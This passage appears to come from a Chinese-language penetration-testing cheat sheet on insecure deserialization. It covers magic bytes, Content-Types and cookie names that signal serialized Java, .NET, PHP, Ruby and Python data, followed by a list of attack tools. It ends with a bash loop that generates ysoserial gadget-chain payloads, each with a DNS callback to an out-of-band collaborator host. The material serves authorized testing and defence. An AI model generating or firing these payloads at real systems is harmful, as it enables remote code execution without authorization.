| `48 02` 或 `63` | 不一 | Hessian（2.0 / 1.0） | Java |

### 14.2 按 Content-Type

| Content-Type | 可能格式 | 风险 |
|---|---|---|
| `application/x-java-serialized-object` | Java ObjectOutputStream | 严重 |
| `application/x-java-serialized-object-xml` | XMLEncoder/XMLDecoder | 严重 |
| `x-application/hessian` | Hessian 二进制 | 严重 |
| `application/x-hessian` | Hessian 二进制 | 严重 |
| `application/x-amf` | AMF（Flash）— 常包 Java | 高 |
| `application/x-yaml` / `text/yaml` | YAML（查 `!!` 标签） | 高（若 YAML.load） |
| `application/java-archive` | JAR 文件 | 看上下文 |
| `application/x-protobuf` | Protobuf（一般安全） | 低 |
| `application/json` 带 `$type` | JSON.NET + TypeNameHandling | 严重 |
| `application/xml` 带可疑元素 | XStream / XMLDecoder | 严重 |

### 14.3 按 Cookie / 参数名

| 名称模式 | 可能格式 | 产品 |
|---|---|---|
| `rememberMe` | Java 序列化 + AES | Apache Shiro |
| `__VIEWSTATE` | .NET ObjectStateFormatter | ASP.NET WebForms |
| `__EVENTTARGET` | .NET（与 ViewState 相关） | ASP.NET WebForms |
| `JSESSIONID` + 二进制 cookie | Java 序列化 | 各类 Java 服务 |
| `rack.session` | Ruby Marshal（base64） | Ruby on Rails / Rack |
| `_session_id` + 二进制 | Python pickle 或 JSON | Django / Flask |
| `connect.sid` | Node.js session（一般 JSON，但也查） | Express |
| `ci_session` | PHP 序列化 | CodeIgniter |
| `PHPSESSID` + 序列化数据 | PHP 序列化 | PHP 应用 |

### 14.4 快速识别脚本

```bash
# 看 base64 解码后的数据是否匹配已知魔数：
echo "BASE64_DATA" | base64 -d | xxd | head -1

# Java：找 "ac ed 00 05"
# .NET BinaryFormatter：找 "00 01 00 00 00 ff ff ff ff"
# Python pickle：找 "80 0N"（N 为协议版本）
# PHP：解码后找 "O:" 或 "a:" 前缀
```

---

## 15. 工具速查

| 工具 | 语言 | 用途 |
|---|---|---|
| **ysoserial** | Java | Java gadget 链 payload 生成 |
| **ysoserial.net** | .NET | .NET gadget 链 payload 生成 |
| **marshalsec** | Java | Hessian、XStream、JNDI、多格式 payload |
| **PHPGGC** | PHP | PHP gadget 链生成（Laravel、Symfony 等） |
| **pimpmykali/ysoserial-modified** | Java | 扩展 ysoserial，链更多 |
| **GadgetInspector** | Java | 在 classpath 中自动化发现 gadget 链 |
| **Blacklist3r** | .NET | ViewState 密钥测试与伪造 |
| **SerializationDumper** | Java | 解码并检查 Java 序列化对象 |
| **jdeserialize** | Java | 解析 Java 序列化流做分析 |

```bash
# ysoserial — 带 DNS 回调批量试链：
for chain in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
  CommonsCollections4 CommonsCollections5 CommonsCollections6 \
  CommonsCollections7 CommonsBeanutils1 Spring1 Spring2 \
  Groovy1 Hibernate1 Jdk7u21 URLDNS; do
  java -jar ysoserial.jar $chain "http://${chain}.TOKEN.collab.net" 2>/dev/null | \
    base64 -w0 > "${chain}.b64"
  echo "Generated: ${chain}"
done
```
